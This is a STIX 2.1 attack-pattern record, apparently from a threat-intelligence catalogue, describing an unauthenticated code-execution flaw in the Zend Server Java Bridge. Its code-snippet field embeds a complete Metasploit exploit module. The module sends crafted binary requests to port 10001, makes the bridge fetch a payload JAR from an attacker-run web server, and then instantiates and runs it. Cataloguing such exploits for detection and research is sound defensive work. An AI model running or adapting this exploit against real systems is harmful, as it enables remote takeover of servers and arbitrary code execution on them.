{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b94db88f-e830-49d1-8c47-aab1f703edef",
    "created": "2024-08-14T17:06:54.326624Z",
    "modified": "2024-08-14T17:06:54.326628Z",
    "name": "Zend Server Java Bridge Arbitrary Java Code Execution",
    "description": " This module takes advantage of a trust relationship issue within the Zend Server Java Bridge. The Java Bridge is responsible for handling interactions between PHP and Java code within Zend Server.  When Java code is encountered Zend Server communicates with the Java Bridge. The Java Bridge then handles the java code and creates the objects within the Java Virtual Machine. This interaction however, does not require any sort of authentication. This leaves the JVM wide open to remote attackers. Sending specially crafted data to the Java Bridge results in the execution of arbitrary java code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/zend_java_bridge.rb",
            "external_id": "zend_java_bridge.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Zend Server Java Bridge Arbitrary Java Code Execution',\n      'Description'    => %q{\n          This module takes advantage of a trust relationship issue within the\n        Zend Server Java Bridge. The Java Bridge is responsible for handling interactions\n        between PHP and Java code within Zend Server.\n\n          When Java code is encountered Zend Server communicates with the Java Bridge. The\n        Java Bridge then handles the java code and creates the objects within the Java Virtual\n        Machine. This interaction however, does not require any sort of authentication. This\n        leaves the JVM wide open to remote attackers. Sending specially crafted data to the\n        Java Bridge results in the execution of arbitrary java code.\n      },\n      'Author'         => [ 'bannedit' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '71420'],\n          [ 'ZDI', '11-113'],\n          [ 'EDB', '17078' ],\n        ],\n      'Platform'       => ['java'], # win\n      'Arch'           => ARCH_JAVA,\n      'Privileged'     => true,\n      'Targets'        =>\n        [\n          [ 'Linux', {}],\n          [ 'Windows', {}],\n        ],\n      'DisclosureDate' => '2011-03-28',\n      'DefaultTarget' => 0))\n      register_options( [ Opt::RPORT(10001) ])\n  end\n\n  def exploit\n    start_service()\n    send_java_require\n  end\n\n  def send_java_require()\n    connect\n\n    jar = rand_text_alpha(rand(8)+1) + '.jar'\n    path = get_uri + '/' + jar\n    uri_len = path.length\n    java_require = [0xffffffff, 0x16000000].pack('V*') +\n    \"setAdditionalClassPath\" + [0x01000000, 0x00000004].pack('V*') +\n    [uri_len].pack('C') + path\n\n    java_require = [java_require.length].pack('N') + java_require\n\n    print_status(\"Sending java_require() request... #{path}\")\n    sock.put(java_require)\n    res = sock.get_once\n\n    select(nil, nil, nil, 5) # wait for the request to be handled\n    create_and_exec\n  end\n\n  def create_and_exec\n    print_status(\"Sending Final Java Bridge Requests\")\n\n    create_obj =\n      [0x34000000, 0x00000000, 0x0c000000].pack('V*') +\n      \"CreateObject\" +\n      [0x02000000, 0x00000004].pack('V*') + [0x12].pack('C') +\n      \"metasploit.Payload\" +\n      [0x07000000].pack('N') + [0x00].pack('C')\n\n    sock.put(create_obj)\n    res = sock.get_once\n    obj_id = res[5,4]\n\n    callmain =\n    [0x1f000000].pack('V') + obj_id + [0x04000000].pack('V') + \"main\" +\n    [0x01000000, 0x00000008, 0x00000201, 0x00040000].pack('V*') + [0x00].pack('C') +\n    [0x00].pack('C') + [0x00].pack('C')\n\n    sock.put(callmain)\n    sock.get_once\n    handler()\n  end\n\n  def on_request_uri(cli, request)\n    if request.uri =~ /\\.jar$/i\n      send_response(cli, payload.encoded,\n      {\n        'Content-Type' => 'application/java-archive',\n        'Connection'   => 'close',\n        'Pragma'       => 'no-cache'\n      })\n\n      print_status(\"Replied to Request for Payload JAR\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-03-28",
    "x_mitre_platforms": [
        "['java'], # win"
    ]
}